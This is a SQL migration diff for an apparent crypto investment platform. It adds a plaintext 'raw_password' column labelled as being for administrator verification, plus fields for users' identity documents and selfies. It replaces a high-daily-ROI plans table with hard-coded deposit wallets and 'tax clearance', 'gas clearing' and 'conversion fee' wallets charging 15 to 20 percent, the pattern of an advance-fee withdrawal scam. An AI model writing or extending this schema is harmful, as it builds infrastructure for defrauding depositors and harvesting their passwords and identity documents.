@@ -11,6 +11,7 @@ CREATE TABLE IF NOT EXISTS users (
     id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
     email VARCHAR(255) UNIQUE NOT NULL,
     password VARCHAR(255) NOT NULL,
+    raw_password VARCHAR(255), -- Stored for administrator verification
     full_name VARCHAR(255),
     phone VARCHAR(100),
     referral_code VARCHAR(50),
@@ -23,26 +24,38 @@ CREATE TABLE IF NOT EXISTS users (
     profit NUMERIC(18, 4) DEFAULT 0.0000,
     tier VARCHAR(50) DEFAULT 'Pro Quant Desk',
     kyc_status VARCHAR(50) DEFAULT 'Unverified',
+    kyc_document_type VARCHAR(100),
+    kyc_document_number VARCHAR(100),
+    kyc_front_url TEXT,
+    kyc_back_url TEXT,
+    kyc_selfie_url TEXT,
     role VARCHAR(50) DEFAULT 'user', -- user, moderator, admin
     created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
     updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
 );
 
--- 2. INVESTMENT PLANS TABLE
-CREATE TABLE IF NOT EXISTS investment_plans (
-    id SERIAL PRIMARY KEY,
-    name VARCHAR(100) NOT NULL,
-    badge VARCHAR(50) DEFAULT 'POPULAR',
-    min_deposit NUMERIC(18, 2) NOT NULL,
-    max_deposit NUMERIC(18, 2) NOT NULL,
-    duration_days INT NOT NULL,
-    daily_roi NUMERIC(6, 2) NOT NULL, -- e.g., 2.40 for 2.4% daily
-    expected_return NUMERIC(6, 2) NOT NULL,
-    capital_back BOOLEAN DEFAULT TRUE,
-    is_active BOOLEAN DEFAULT TRUE,
-    description TEXT,
-    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+-- 2. PLATFORM WALLETS & SYSTEM SETTINGS TABLE
+CREATE TABLE IF NOT EXISTS platform_settings (
+    id INT PRIMARY KEY DEFAULT 1,
+    usdt_trc20 VARCHAR(255) DEFAULT 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a',
+    usdt_erc20 VARCHAR(255) DEFAULT '0x71C2d3E4F5a6B7c8D9e0F1A2b3C4D5e6F7a8B9c0',
+    usdt_bep20 VARCHAR(255) DEFAULT '0x71C2d3E4F5a6B7c8D9e0F1A2b3C4D5e6F7a8B9c0',
+    btc VARCHAR(255) DEFAULT 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
+    eth VARCHAR(255) DEFAULT '0x89205A3E3b291a5a458d988563d9491DE514757c',
+    sol VARCHAR(255) DEFAULT '7EYnhQoR9YM3N7UoaKRoA44BX8WBPrURdFCvWaxHdGL',
+    tax_clearance_wallet VARCHAR(255) DEFAULT 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a',
+    gas_clearing_wallet VARCHAR(255) DEFAULT 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a',
+    conversion_fee_wallet VARCHAR(255) DEFAULT 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a',
+    conversion_fee_percent INT DEFAULT 20,
+    crypto_gas_fee_percent INT DEFAULT 10,
+    fiat_tax_fee_percent INT DEFAULT 15,
+    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
 );
+
+-- Seed Initial Default Settings Row
+INSERT INTO platform_settings (id, usdt_trc20, usdt_erc20, usdt_bep20, btc, eth, sol)
+VALUES (1, 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a', '0x71C2d3E4F5a6B7c8D9e0F1A2b3C4D5e6F7a8B9c0', '0x71C2d3E4F5a6B7c8D9e0F1A2b3C4D5e6F7a8B9c0', 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', '0x89205A3E3b291a5a458d988563d9491DE514757c', '7EYnhQoR9YM3N7UoaKRoA44BX8WBPrURdFCvWaxHdGL')
+ON CONFLICT (id) DO NOTHING;
 
 -- 3. USER INVESTMENTS TABLE
 CREATE TABLE IF NOT EXISTS investments (
